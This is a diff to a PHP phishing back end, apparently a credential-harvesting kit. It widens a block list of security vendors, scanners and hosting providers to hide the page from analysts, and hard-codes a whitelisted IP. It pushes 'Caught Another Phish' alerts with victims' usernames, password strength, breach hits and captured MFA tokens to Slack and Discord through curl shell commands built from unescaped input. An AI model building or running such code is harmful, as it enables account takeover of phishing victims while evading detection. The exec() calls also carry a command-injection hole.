@@ -23,13 +23,13 @@ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
 $org = $details->org;
 
 // List of Orgs to be Blacklisted
-$blockorgs = array("LINZ STROM GAS WAERME GmbH fuer Energiedienstleistungen und Telekommunikation","Qinghai Telecom","Cisco Systems Ironport Division","CT-SHANXI-MAN-2","EDINAYA SET LIMITED LIABILITY COMPANY","GEMNET LLC","YANDEX LLC","1337 Services GmbH","ALGAR TELECOM S/A","ARABIAN INTERNET & COMMUNICATIONS SERVICES CO.LTD","BL Networks","Bharti Airtel Ltd., Telemedia Services","CDS Global Cloud Co., Ltd","China Mobile Communications Group Co., Ltd.","China Unicom IP network","Excitel Broadband Private Limited","Free SAS","GigeNET","Henan Mobile Communications Co.,Ltd","IDC, China Telecommunications Corporation","INCX Global, LLC","ISP4Life INC","Korea Telecom","Oracle Corporation","PEG TECH INC","PT Indonesia Comnets Plus","SK Broadband Co Ltd","Skyway West","Squarespace, Inc.","WhiteLabelColo","networksdelmanana.com","SkyLink Data Center BV","Red Byte LLC","M247 Europe SRL","Packet Exchange Limited","Dino Solutions, Inc.","SCALEWAY S.A.S.","DigitalOcean, LLC","Amazon.com, Inc.","Google LLC","OVH SAS","Amazon.com, Inc.","Cogent Communications","China Unicom Shanghai network","AVAST Software s.r.o.","Kaspersky Lab Switzerland GmbH","Nexeon Technologies, Inc.","HostRoyale Technologies Pvt Ltd","The Constant Company, LLC","Data Center Experts LTD","CenturyLink Communications, LLC","Hetzner Online GmbH","Login, Inc.","myLoc managed IT AG","Stanford University","GTT Communications Inc.","DediPath","VegasNAP, LLC","Massachusetts Institute of Technology","Google LLC","H4Y Technologies LLC","Sundance International LLC","CHINANET","UK Dedicated Servers Limited","Alibaba","Performive LLC","CHINA UNICOM China169 Backbone","B2 Net Solutions Inc.","CHINANET Guangdong province network","Zwiebelfreunde e.V.","Akamai Connected Cloud","Viettel Group","SAKURA Internet Inc.","Microsoft Corporation","A1 Telekom Austria AG","The Communication Authoity of Thailand, CAT","Aggros Operations Ltd.","Akamai Connected Cloud","Amazon.com, Inc.","CHINA UNICOM China169 Backbone","CHINANET","CHINANET Guangdong province network","CariNet, Inc.","Censys, Inc.","CenturyLink Communications, LLC","Cox Communications Inc.","DigitalOcean, LLC","Ferdinand Zink trading as Tube","Google LLC","HQDATA","Hetzner Online GmbH","Hurricane Electric LLC","M247 Europe SRL","OVH SAS","Office National des Postes et Telecommunications","ReliableSite.Net LLC","Sapinet SAS","Stanford University","Tamatiya EOOD","UCLOUD INFORMATION TECHNOLOGY (HK)","Virtual Systems LLC","Wana Corporate","Zenlayer Inc","Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083");
+$blockorgs = array("1337 Services GmbH","31173 Services AB","321net","A1 Telekom Austria AG","ALGAR TELECOM S/A","AOFEI DATA INTERNATIONAL COMPANY LIMITED","ARABIAN INTERNET & COMMUNICATIONS SERVICES CO.LTD","AVAST","AVAST Software s.r.o.","Ace Host, LLC","Afrihost","Aggros Operations Ltd.","Akamai Connected Cloud","Alibaba","Allstream","Alsycon B.V.","Amazon","Amazon.com, Inc.","B2 Net Solutions Inc.","BKTech","BL Networks","BRASIL S.A","Beijing","Berhad","Bharti Airtel Ltd., Telemedia Services","Blix Solutions AS","Bouygues Telecom SA","CDS Global Cloud Co., Ltd","CHINA UNICOM China169 Backbone","CHINANET","CHINANET Guangdong province network","CT-SHANXI-MAN-2","CariNet","CariNet, Inc.","Censys, Inc.","CenturyLink Communications, LLC","China Mobile Communications Group Co., Ltd.","China Unicom Guangdong IP network","China Unicom IP network","China Unicom Shanghai network","Cisco Systems Ironport Division","Cogent Communications","ColoCrossing","Contabo","Cox Communications Inc.","Data Center Experts LTD","DataHata","Datacamp Limited","DediPath","DigitalOcean","DigitalOcean, LLC","Dino Solutions, Inc.","EDINAYA SET LIMITED LIABILITY COMPANY","EGIHosting","Emerald Onion","Emsisoft","Excitel Broadband Private Limited","Faction","FastNet","Fastweb","Ferdinand Zink trading as Tube","Forcepoint","Fortinet","Free SAS","Free Technologies","GEMNET LLC","GHOSTnet","GTT Communications Inc.","Geekyworks IT Solutions Pvt Ltd","GigeNET","GleSYS AB","Globalhost d.o.o","GoDaddy","Google LLC","Guanghuan Xinwang","H4Y Technologies LLC","H88 WEB HOSTING S.R.L.","HIVELOCITY","HQDATA","HangZhou","Henan Mobile Communications Co.,Ltd","Hetzner","Hetzner Online GmbH","Host Universal Pty Ltd","HostRoyale","HostRoyale Technologies Pvt Ltd","Huawei","Hurricane Electric","Hurricane Electric LLC","IDC, China Telecommunications Corporation","INCX Global, LLC","IP Volume","IPAX","ISP4Life INC","Internap","Kaspersky","Kaspersky Lab Switzerland GmbH","Kejizhongyi","Korea Telecom","LINZ STROM GAS WAERME GmbH fuer Energiedienstleistungen und Telekommunikation","Labitat","Leaseweb USA, Inc.","Linode","Login, Inc.","M247","M247 Europe SRL","Markus","Massachusetts Institute of Technology","McAfee","Merit Network","Microsoft","Microsoft Corporation","Mimecast","MivoCloud SRL","NForce Entertainment","Netcraft","Netplus Broadband Services Private Limited","Nexeon Technologies, Inc.","Norton","ONLINE S.A.S.","OVH SAS","Office National des Postes et Telecommunications","Optisprint","Oracle Corporation","Orange Polska Spolka Akcyjna","PALO ALTO","PEG TECH INC","PT Indonesia Comnets Plus","Packet Exchange","Packet Exchange Limited","Performive LLC","Plusnet","Pogliotti","Powerhouse Management","Qinghai Telecom","QuadraNet","QuickPacket, LLC","RIPE","Rackspace","Red Byte LLC","ReliableSite.Net LLC","SAKURA Internet Inc.","SCALEWAY S.A.S.","SIMBANET","SK Broadband Co Ltd","SWIFT ONLINE BORDER","Sapinet SAS","Scalair SAS","Selectel","Sia Nano IT","Sistemas Informaticos, S.A.","SkyLink Data Center BV","Skyway West","SoftLayer Technologies","Spectre Operations","Squarespace, Inc.","Stanford University","Strong Technology, LLC.","SunGard","Sundance International LLC","TEFINCOM S.A.","TELEFONICA DE ESPANA S.A.U.","TalkTalk Communications","Tamatiya EOOD","Telefonica del Peru","The Communication Authoity of Thailand, CAT","The Constant Company, LLC","Total Server","UCLOUD INFORMATION TECHNOLOGY (HK)","UK Dedicated Servers Limited","VegasNAP, LLC","Verizon","Viettel Group","Vimpelcom","Virtual Systems LLC","Visual Trading Systems, LLC","VolumeDrive","Wana Corporate","Web2Objects","WestHost","WhiteLabelColo","Wintek Corporation","YANDEX LLC","YISP","ZSCALER","Zenlayer","Zenlayer Inc","Zwiebelfreunde e.V.","myLoc managed IT AG","networksdelmanana.com","Hyonix LLC","Amazon.com, Inc.","Quad9","Tier.Net Technologies LLC","Universo Online S.A.","Cellcom Fixed Line Communication L.P","Telefonica UK Limited","Keliweb S.R.L","PrivateSystems Networks","Smart Technology LLC","Latitude.sh","Corporación Dana S.A.","Core-Backbone GmbH","Owl Limited","Tech Futures Interactive Inc.","Orion Network Limited","i3D.net B.V","Web2Objects LLC","Alibaba (US) Technology Co., Ltd.","Asahi Net","Leaseweb Deutschland GmbH","Verizon Business","Bitdefender SRL","CHINANET-BACKBONE","Powerhouse Management, Inc.","INTERNET MEASUREMENT","F3 Netze e.V.","AEZA GROUP Ltd","GSL Networks Pty LTD","Obenetwork AB","Huawei Cloud Service data center","QuadraNet Enterprises LLC","Contabo GmbH","A2B IP B.V.","TerraHost AS","TeleData GmbH","Bell Canada","CHINATELECOM Guangxi Nanning IDC networkdescr: Nanning , Guangxi Province, P.R.China.","G-Core Labs S.A.","Leaseweb Asia Pacific pte. ltd.","trafficforce, UAB","Commtouch Inc.","Hivelocity Inc","net4sec UG","Clouvider","My Tech BZ","Vodafone GmbH","GMO Internet,Inc","PT Telekomunikasi Indonesia","IONOS SE","Limestone Networks, Inc.","Foundation for Applied Privacy","GREEN FLOID LLC","RCS & RDS SA","Shenzhen Tencent Computer Systems Company Limited","ANJANI BROADBAND SOLUTIONS PVT.LTD.","Level 3 Parent, LLC","VeriSign Infrastructure & Operations","China Unicom  IP network China169 Guangdong province","Artnet Sp. z o.o.","Webline Services Inc","China Telecom (Group)","Private Layer INC","TerraTransit AG","Data Communication Business Group","Apple Inc.","RWTH Aachen University","Andrei Tiberiu Holt","Rethem Hosting LLC","FPT Telecom Company","Facebook, Inc.","Psychz Networks","SunValley New Oriental","Flokinet Ltd","China Telecom","Internet Vikings International AB","SEMrush CY LTD","Optimum WiFi","RouterHosting LLC","Sichuan Chuanxn IDC","FranTech Solutions","SIA VEESP","VIVID-HOSTING LLC");
 
 //block via blacklist
 
 // UNCOMMENT AND ADD YOUR IP TO WHITELIST ONLY YOU BEFORE STARTING, THEN SWITCH COMMENTS TO ALLOW ALL BUT BLACKLIST
-//if($ip != "YOUR_IP_HERE!!") {
-if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {
+if($ip != "75.103.132.161") {
+//if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {
 
 // Content for Orgs to see on the Blacklist
 //echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
@@ -362,6 +362,8 @@ if($redirect == false && !isset($redirurl)){ ?>
 
 <?php } }
 
+$redirect = "";
+
 if($redirect != ""){
 
 // See if Redirect Location Allows Iframes
@@ -468,11 +470,11 @@ exec($cmdtrophy5);
 } else $TroyHunt = "no";
 
 // If the Password is Set, Change Slack Message
-$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\n> Password Strength is ".$passstrength;
+$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\\r\\n> Password Strength is ".$passstrength;
 
 if($passstrength == ":poop:"){$pushstrength = "💩";}else{$pushstrength = "👌";}
 
-$messagepush = "Caught Another Phish at ".$portal."!\r\nPassword Strength is ".$pushstrength;
+$messagepush = "Caught Another Phish at ".$portal."!\\r\\nPassword Strength is ".$pushstrength;
 
 $messagediscord = "> Caught Another Phish at ".$portal."! ([".$user."](".$slacklink."))\\n> Password Strength is ".$passstrength;
 
@@ -488,24 +490,27 @@ $messagediscord = "> Caught Another Phish at ".$portal."! (\[".$user."](".$slack
 }
 
 if($TroyHunt == "yes"){
-	$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
+	$message = $message."\\r\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
 	$messagediscord = $messagediscord."\\n> *_HaveIBeenPwned Hit_* (".number_format($haveibeenpwnedhits).")";
-	$messagepush = $messagepush."\r\nHaveIBeenPwned Hit (".number_format($haveibeenpwnedhits).")";
+	$messagepush = $messagepush."\\r\\nHaveIBeenPwned Hit (".number_format($haveibeenpwnedhits).")";
 	}
 
 if($MFAToken != ""){
-$message = $message."\r\n> MFA Provided as `".$MFAToken."`";
+$message = $message."\\r\\n> MFA Provided as `".$MFAToken."`";
 $messagediscord = $messagediscord."\\n> MFA Provided as `".$MFAToken."`";	
-$messagepush = $messagepush."\r\nMFA Provided as ".$MFAToken."";
+$messagepush = $messagepush."\\r\\nMFA Provided as ".$MFAToken."";
 }
 
 
 if($SlackIncomingWebhookURL != ""){
 
 // Execute Slack Incoming Webhook
-$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';
+$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';
 
-exec($cmd);
+exec($cmd,$cmdoutput);
+echo $cmd;
+
+//var_dump($cmdoutput);
 
 }
 
@@ -519,7 +524,7 @@ exec($cmdpush);
 if($DiscordWebhook != ""){
 
 // Execute Discord Incoming Webhook
-//$messagediscord = urlencode($messagediscord);
+$messagediscord = urlencode($messagediscord);
 
 $cmddiscord = 'curl -s -X POST -d \'{"username": "'.$slackbotname.'", "content": "'.$messagediscord.'", "avatar_url": "https://i.imgur.com/C0avyV1.png"}\' '.$DiscordWebhook.' -H \'Content-Type:application/json\'';
 
